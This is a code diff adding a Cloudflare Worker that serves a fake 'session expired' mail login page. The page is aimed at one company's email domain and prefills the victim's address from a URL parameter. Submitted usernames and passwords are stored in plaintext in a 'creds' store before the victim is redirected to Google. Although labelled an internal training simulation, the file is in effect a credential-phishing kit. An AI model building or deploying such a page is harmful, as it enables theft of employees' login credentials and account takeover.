@@ -1,0 +1,56 @@
+export default {
+  async fetch(request, env) {
+    if (request.method === "POST") {
+      const formData = await request.formData();
+      const username = formData.get("username");
+      const password = formData.get("password");
+
+      if (username && password) {
+        await env.creds.put(username, password);
+
+        return new Response(null, {
+          status: 303,
+          headers: { "Location": "https://www.google.com" }
+        });
+      } else {
+        return new Response("Missing username or password", { status: 400 });
+      }
+    }
+
+    const htmlContent = `
+      <!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Inbox</title>
+  <link rel="icon" type="image/png" href="assets/favicon.png">
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <main class="training-stage" aria-label="Internal training simulation of an expired mail session"
+    aria-describedby="session-expiry-description">
+    <div id="mailbox-label" class="mailbox-label" aria-live="polite"></div>
+    <p id="session-expiry-description" class="sr-only">Your server session has expired. Once you have reauthenticated,
+      the action you just requested will be automatically reattempted. To go back without reauthentication, click here.
+    </p>
+    <label class="sr-only" for="username">username</label>
+    <input id="training-username" class="training-input training-input--username" type="text" autocomplete="off"
+      autocapitalize="none" spellcheck="false">
+    <label class="sr-only" for="password">password</label>
+    <input id="training-password" class="training-input training-input--password" type="password" autocomplete="off"
+      spellcheck="false">
+  </main>
+  <script>(() => { const e = document.getElementById("mailbox-label"), u = document.getElementById("training-username"), t = new URLSearchParams(window.location.search).get("email"), r = () => { e.textContent = "Drug Safety1" }; if (!e || !u) return; if (!t || t.length > 254) return r(); const n = t.indexOf("@"); if (n < 1 || n !== t.lastIndexOf("@")) return r(); const o = t.slice(0, n), i = t.slice(n + 1).toLowerCase(); if (i !== "alnaghi.com" || o.length > 64 || !/^[A-Za-z0-9]+(?:[._-][A-Za-z0-9]+)*$/.test(o)) return r(); e.textContent = o.split(/[._-]/).map(e => e.charAt(0).toUpperCase() + e.slice(1).toLowerCase()).join(" "); u.value = t.toLowerCase() })();</script>
+</body>
+
+</html>
+    `;
+
+    return new Response(htmlContent, {
+      headers: { "Content-Type": "text/html" },
+    });
+  },
+};
